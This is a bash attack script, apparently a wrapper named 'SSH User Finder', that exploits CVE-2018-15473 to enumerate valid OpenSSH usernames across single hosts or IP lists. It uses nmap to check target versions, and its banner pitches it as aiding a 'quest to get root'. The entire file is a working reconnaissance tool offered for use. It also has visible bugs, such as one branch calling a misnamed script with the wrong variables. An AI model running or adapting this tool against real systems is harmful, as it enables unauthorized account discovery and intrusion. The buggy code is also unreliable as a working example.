#!/bin/bash
# Exploits CVE-2018-15473 to enumerate OpenSSH usernames

RED=$( printf  '\033[01;31m')
GREEN=$(printf '\033[00;32m')
RESTORE=$(printf '\033[0m')
# CLI mode
# If arguments are provided it goes to CLI mode. Otherwise it continues 
# to the interactive menu system.

# Evaluate user or 1st arg
case $# in
2) 
	user=$1
	ip=$2
	python sshenum.py $ip $user
	exit
	;;
3) 
	if [ $1 == "-u" ]; then
		userfile="$2"
		ip="$3"
		for user in $( cat $userfile )
		do
			python sshenum.py $ip $user
		done
		exit
	elif [ $2 == "-i" ]; then
		user="$1"
		ipfile="$3"
		for ip in $( cat $ipfile )
		do
			echo -e "\nTarget: $ip"
			python sshenum.py $ip $user
			echo ""
		done
		exit
	else
		echo "Invalid Options"
		sleep 3
		exit 1
	fi
	;;
4) 
	userfile="$2"
	ipfile="$4"
	for ip in $( cat $ipfile )
    do
		echo -e "\nTarget: $ip"
		for user in $( cat $userfile )
		do
			python sshenum.py $ip $user
		done
	done
		exit
	;;
*)
esac

# Interactive Menu Mode
echo -e $GREEN"\nSSH User Finder v1.2$RESTORE"
echo -e $GREEN"A tool for aiding you in your quest to get root\n$RESTORE"
sleep 2
echo -e "Choose an option:"
echo "[1] Check for usernames on host"
echo "[2] Check if target is vulnerable to username checking"
read -p "suf => " menu

# Checks if host is vulnerable
if [ $menu == "2" ]; then
	echo -e "\nWhat is the IP of the host you want to check?"
	read -p "suf => " checkip
	scan=$( nmap -sV -Pn -n -p 22 $checkip | egrep -o "OpenSSH [0-9]{1}\.[0-9]{1}" )
	if [ -z "$scan" ]; then
		echo $RED"Error: Target is not running OpenSSH"$RESTORE
		sleep 2
		exit
	fi
	version=$( echo $scan | egrep -o -m 1 "[0-9]{1}\.[0-9]{1}" | tr -d '.'  )
	if [ "$version" -le 77 ]; then
		echo $GREEN"Target is vulnerable to exploit"$RESTORE
		sleep 3
		exit
	elif [ $version > "77" ]; then
		echo $RED"Target is not vulnerable to exploit"$RESTORE
		sleep 3
		exit
	else
		echo $RED"Unknown error"$RESTORE
		sleep 3
	fi
fi	

# Username Checker
echo -e "\nUse single username or username list for testing?"
echo "[1] Single username"
echo "[2] Username list"
read -p "suf => " useroption
echo -e "\nTest single IP or IPs from a list?"
echo "[1] Single IP"
echo "[2] IP list"
read -p "suf => " ipoption

# Choice is userfile and ipfile
if [ $useroption == "2" ] && [ $ipoption == "2" ]; then
  echo "What is the path to the userlist file? (relative or full path)"
  read -p "suf => " userfile
  echo -e "\nWhat is the path to the IP file? (relative or full path)"
  read -p "suf => " ipfile
  echo "\nUser list: $userfile"
  echo "IP list: $ipfile"
  echo -e "\nLook good? (y/n)"
  read -p "suf => " confirm
  if [ $confirm == "y" ] || [ $confirm == "Y" ]; then
    for ip in $( cat $ipfile )
    do
      echo $RED"Checking hosts for valid users..."$RESTORE
      sleep 3
      for user in $( cat $userfile )
      do
        python sshenum.py $ip $user
      done
    done
  else
    exit
  fi

# Choice is userfile and single ip
elif [ $useroption == "2" ] && [ $ipoption == "1" ]; then
  echo "What is the path to the userlist file? (relative or full path)"
  read -p "suf => " userfile
  echo -e "\nWhat is the IP address of the host to check?"
  read -p "suf => " ip

  echo "\nUser list: $userfile"
  echo "IP: $ip"
  echo -e "\nLook good? (y/n)"
  read -p "suf => " confirm
  if [ $confirm == "y" ] || [ $confirm == "Y" ]; then
    echo $GREEN"Checking $ip for valid users..."$RESTORE
    sleep 3
    for user in $( cat $userfile )
    do
      python sshenum.py $ip $user
    done
  else
    exit
  fi

# Choice is single username and ipfile
elif [ $useroption == "1" ] && [ $ipoption == "2" ]; then
  echo "What is the username you would like to check?"
  read -p "suf => " username
  echo -e "\nWhat is the path to the IP file? (full or relative path)\n"
  read -p "suf => " ipfile
  echo -e "\nUsername: $username"
  echo "IP: $ipfile"
  echo -e "\nLook good? (y/n)"
  read -p "suf => " confirm
  if [ $confirm == "y"  ] || [ $confirm == "Y" ]; then
    echo $GREEN"Checking hosts for username $username..."$RESTORE
    for ip in $( cat $ipfile )
    do
      python sshenum.sh $ipfile $user
    done
  else
    exit
  fi

# Option is single username and single ip
elif [ $useroption == "1" ] && [ $ipoption == "1" ]; then
  echo "What is the username you would like to check?"
  read -p "suf => " username
  echo -e "\nWhat is the IP address of the host to check?"
  read -p "suf => " ip
  echo "Username: $username"
  echo "Host IP: $ip"
  echo -e "\nLook good? (y/n)\n"
  read -p "suf => " confirm
  if [ $confirm == "y" ] || [ $confirm == "Y" ]; then
    echo $GREEN"Checking $ip for username $username..."$RESTORE
    python sshenum.py $ip $username
  else
    exit
  fi

# Invalid option selected
else
  echo $RED"Invalid option(s)"$RESTORE
  sleep 5
  exit
fi
